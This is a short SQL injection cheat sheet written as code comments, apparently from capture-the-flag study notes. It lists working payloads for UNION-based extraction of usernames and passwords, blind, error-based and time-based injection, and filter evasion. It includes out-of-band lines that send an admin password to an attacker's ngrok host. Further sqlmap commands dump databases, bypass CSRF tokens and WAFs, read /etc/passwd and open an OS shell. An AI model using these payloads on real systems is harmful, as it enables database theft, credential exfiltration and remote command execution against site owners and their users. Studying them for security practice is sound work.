// Sql Injection
//! when the results of the query are returned within the application
//* basic injection
// ' payload ; -- or #
// SELECT a, b FROM table1 UNION SELECT c, d FROM table2 # must have same column number and same column types
// SELECT * FROM something UNION SELECT 1,2,3,4,*,6 FROM flag WHERE '1 // something has 6 columns and flag has 1
//* determining the required number of columns
// ' ORDER BY 1-- || ' UNION SELECT NULL--
// ' ORDER BY 2-- || ' UNION SELECT NULL,NULL--
// ' ORDER BY 3-- || ' UNION SELECT NULL,NULL,NULL--
// when this breaks it means that you reached the limit because if you have 3 columns you can order by 2 by never by 4
//? note:
//  NULL is compatibale with every data type
//* determining the type of exact columns
// ' UNION SELECT 'a',NULL,NULL,NULL--u
//* retreaving two columns in just one columns
// ' UNION SELECT username || '~' || password FROM users-- # username~password
//* determining database tables
// SELECT * FROM information_schema.tables # TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
//* determining table columns
// SELECT * FROM information_schema.columns
//! Blind sqli
//* when you don't know what you are loking for just a prefix
//  select name from users where name LIKE 'alphactf%' // % wild card
//  select name from user where name similar to "alphactf{randomchars" // works only in postgress
//* whene there is a sign coming from the server
// xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
// LENGTH() : to get password length first
//* when there is no sign coming from the server
// ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
// oracle : '||(SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
// ' AND (CASE WHEN (SUBSTRING(@@version,1,1) > 1) THEN 'a' ELSE 1/1 END)='a
//* when the server return the error message and it contains the query
// CAST((SELECT example_column FROM example_table) AS int) # this can return error conveting "data" to int
//* when the server handles errors in a good way we can use time as a sign
// '; IF (1=1) WAITFOR DELAY '0:0:10'--
//* out of bound
// we try to evaluate the query and send to a server of our own
// ' UNION SELECT NULL,NULL,password FROM users WHERE username='admin' INTO OUTFILE '//<subdomain>.ngrok.io/pw'--
// ' AND (SELECT password FROM users WHERE username='admin') LIKE 'p%' AND (SELECT LOAD_FILE('//<subdomain>.ngrok.io/p'))--
//* read and wright files
// ' union select 1,'text',2,3 into outfile '/path/to/file'--
// ' union select 1,load_file('/path/to/file'),2,3--
//* sqli filteing
// or => --
// or -- => ;
// word => wo'+or||'rd

// select * where username='admin' and password='sldkfjdlj'
// =>                       ad'||'min           a' is not b'
//! sqlmap
//* get dbs
// sqlmap -u "http://target.com/page.php?id=1" --dbs
//* get tables
// sqlmap -u "http://target.com/page.php?id=1" --tables
//* get content
// sqlmap -u "http://target.com/page.php?id=1" --dump
//* you can specify a specific table inside a db
// sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name --dump
//* send post requests
// sqlmap -u 'http://www.example.com/' --data 'id=1'
// sqlmap -u 'http://94.237.54.145:56567/action.php' --data '{"id":"1"}' --dump
//* process cookies
// sqlmap -u 'http://www.example.com/' --cookie='id=1' --level=2
//* show errors
// sqlmap -u "http://target.com/page.php?id=1" --parse-errors
//* get general data
// --banner
// --current-user
// --current-db
// --is-dba
// --schema
//* Anti-CSRF Token Bypass
// sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
//* Unique Value Bypass
// sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
//* Calculated Parameter Bypass
// sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
//* WAF Bypass
// --skip-waf
//* User-agent Blacklisting Bypass
// --random-agent
//* reading a file
// sqlmap -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
//* remote shell
// sqlmap -u "http://94.237.48.12:38728/?id=1" --os-shell